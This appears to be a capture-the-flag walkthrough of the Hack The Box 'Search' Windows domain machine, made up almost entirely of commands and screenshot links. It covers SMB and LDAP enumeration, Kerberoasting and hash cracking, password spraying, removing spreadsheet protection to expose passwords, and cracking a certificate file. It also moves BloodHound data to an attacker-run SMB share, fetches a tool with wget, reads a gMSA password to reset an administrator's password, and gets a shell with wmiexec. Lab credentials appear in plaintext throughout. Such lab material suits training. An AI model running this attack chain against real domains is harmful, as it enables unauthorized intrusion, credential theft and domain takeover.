```
smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/hope.sharp
ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.11.129
./GetUserSPNs.py search.htb/hope.sharp -dc-ip 10.10.11.129 -request
john hash-web_svc -w=/usr/share/wordlists/rockyou.txt
crackmapexec smb 10.10.11.129 -u user_opt.txt -p @3ONEmillionbaby
sheetProtection
pfx2john staff.pfx > pfx_hash
./SharpHound.exe
./smbserver.py share . -smb2support -username df -password df
./BloodHound
./wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'
```



```
nmap -sS -sC -sV -T5 -Pn 10.10.11.129
```
![image](https://user-images.githubusercontent.com/33616880/230699143-58aa6593-510f-4de6-be67-cbf555c08f22.png)


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.11.129/FUZZ -e .aspx,.php,.txt,.html
```
![image](https://user-images.githubusercontent.com/33616880/230701612-546d5a49-33f8-4063-8d96-72d2d45f9cfe.png)


hope.sharp | IsolationIsKey?

![image](https://user-images.githubusercontent.com/33616880/230699047-df9e814d-0ef6-4377-97bd-72824e5dd6e5.png)


```
crackmapexec smb 10.10.11.129 -u Hope.Sharp -p IsolationIsKey?
```
![image](https://github.com/regarmulia/HTB/assets/33616880/e60a5f3f-687d-49d2-854f-83268863b008)


```
smbclient -L \\\\10.10.11.129\\ -U search.htb/hope.sharp
smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/hope.sharp
```
![image](https://user-images.githubusercontent.com/33616880/230700602-75be21ee-a7d1-4ed8-8465-1a226ae419f0.png)
![image](https://user-images.githubusercontent.com/33616880/230700731-c773018c-6f8d-4ed7-8812-ced8a52b3d05.png)


```
ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.11.129
```
![image](https://user-images.githubusercontent.com/33616880/230699359-15a9ef35-6723-4822-b1e6-ab93ec59e2cb.png)
![image](https://user-images.githubusercontent.com/33616880/230699421-3b664dda-82d1-473a-8c1f-2b29de81fb90.png)


```
cp /usr/share/doc/python3-impacket/examples/GetUserSPNs.py .
./GetUserSPNs.py search.htb/hope.sharp -dc-ip 10.10.11.129 -request
```
![image](https://user-images.githubusercontent.com/33616880/230699598-ab7213a0-fb91-4395-a5b0-345b7e2fb34a.png)


```
john hash-web_svc -w=/usr/share/wordlists/rockyou.txt
```
web_svc | @3ONEmillionbaby

![image](https://user-images.githubusercontent.com/33616880/230699690-2850b510-c824-49fa-a20f-c4a3044c0fc1.png)


![image](https://user-images.githubusercontent.com/33616880/230699760-4770c7a8-b7ee-4a9d-9398-d2298e8863e4.png)


```
grep "HelpDesk User" domain_users.grep | awk -F'\t' '{print $3}'
```
![image](https://user-images.githubusercontent.com/33616880/230700117-68ed59b8-9ab2-4831-be38-7421ada171f7.png)



```
crackmapexec smb 10.10.11.129 -u user_opt.txt -p @3ONEmillionbaby
```
search.htb\Edgar.Jacobs:@3ONEmillionbaby

![image](https://user-images.githubusercontent.com/33616880/230700260-1809d1ec-e297-4d00-9ba5-5213526fed84.png)


```
smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/Edgar.Jacobs
```
![image](https://user-images.githubusercontent.com/33616880/230700969-8a257621-812a-4357-b398-5949598ce182.png)


![image](https://user-images.githubusercontent.com/33616880/230701046-18ec17fc-1694-4a03-9a76-90f26e1ae622.png)
```
unzip Phishing_Attempt.xlsx
sed -i 's/<sheetProtection[^>]*>//' xl/worksheets/sheet2.xml
zip -fr Phishing_Attempt.xlsx *
```
Sierra.Frye | $$49=wide=STRAIGHT=jordan=28$$18

![image](https://user-images.githubusercontent.com/33616880/230701177-73c2b4d3-8c15-4e0d-9930-900c7ce19fcf.png)
![image](https://user-images.githubusercontent.com/33616880/230701253-86e219b9-7f85-4d24-a73a-479962c1c0fa.png)


```
smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/Sierra.Frye
```
![image](https://github.com/regarmulia/HTB/assets/33616880/74e7abd8-4bb1-4dce-99a5-a9adeeb4d3ab)
![image](https://user-images.githubusercontent.com/33616880/230701438-ca0a0370-ad85-4b25-bb67-c9491f61bde8.png)
![image](https://user-images.githubusercontent.com/33616880/230701452-c57c8661-21de-4ef7-bc42-0e57ef04ab48.png)
![image](https://user-images.githubusercontent.com/33616880/230701555-c290fc03-b77a-4471-8dbf-3ebf49ad7348.png)



![image](https://user-images.githubusercontent.com/33616880/230701672-0cf8bba7-d1d6-442d-b859-5371cf1395d7.png)
![image](https://user-images.githubusercontent.com/33616880/230701705-26df0b61-24f9-4d58-a34f-b7830a9f3358.png)
```
pfx2john staff.pfx > pfx_hash
john pfx_hash -w=/usr/share/wordlists/rockyou.txt
```
![image](https://user-images.githubusercontent.com/33616880/230701880-f44b38ab-db4a-45e3-9544-d36bb638e82f.png)
![image](https://user-images.githubusercontent.com/33616880/230701923-cfcd0109-1539-44e5-94e6-5200460228e7.png)


![image](https://user-images.githubusercontent.com/33616880/230702031-e7010f86-fe69-4c70-897d-f3312121b1b4.png)
```
python3 -m http.server 80
wget 10.10.14.4/SharpHound.exe -o SharpHound.exe
./SharpHound.exe
```
![image](https://user-images.githubusercontent.com/33616880/230702230-01468743-51b4-4de4-8cc5-d551ec9d23b7.png)
![image](https://user-images.githubusercontent.com/33616880/230702368-31f4bfd3-58cc-41fd-a2d2-6ffa6264cda3.png)



```
./smbserver.py share . -smb2support -username df -password df
```
```
net use \\10.10.14.4\share /u:df df
copy 20230408050326_BloodHound.zip \\10.10.14.4\share\
```
![image](https://user-images.githubusercontent.com/33616880/230702582-cbaa9574-1756-4d57-9405-98a64c26d111.png)
![image](https://user-images.githubusercontent.com/33616880/230702543-ff4a81d9-d0e4-4c98-a178-ecd3f25e694f.png)


```
neo4j console
```
```
./BloodHound --no-sandbox
```
![image](https://user-images.githubusercontent.com/33616880/230702699-6fd438f6-781c-4644-85b6-772e17713fd8.png)


mark user as owned

shortest to admin

![image](https://user-images.githubusercontent.com/33616880/230702940-0fd2b84e-cecb-40f6-9f23-9e64f4a29a64.png)



```
$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp

(ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword


$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $SecPass
Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText '0xdf0xdf!!!' -force)} -Credential $cred
```


![image](https://user-images.githubusercontent.com/33616880/230703076-28fdc717-d1b7-4ea9-94bd-1c35d378850e.png)
![image](https://user-images.githubusercontent.com/33616880/230703110-45490071-b360-4172-91bf-735b46483878.png)


```
crackmapexec smb 10.10.11.129 -u tristan.davies -p '0xdf0xdf!!!'
```
![image](https://user-images.githubusercontent.com/33616880/230703231-2e3c66d2-d334-42e4-942b-451e11657cc7.png)



```
./wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'
```
![image](https://user-images.githubusercontent.com/33616880/230714809-9dd294bd-b315-40d8-b82c-082a0a133860.png)

![image](https://user-images.githubusercontent.com/33616880/230714830-96b20de5-c6d6-477f-9fe4-318864d1972f.png)
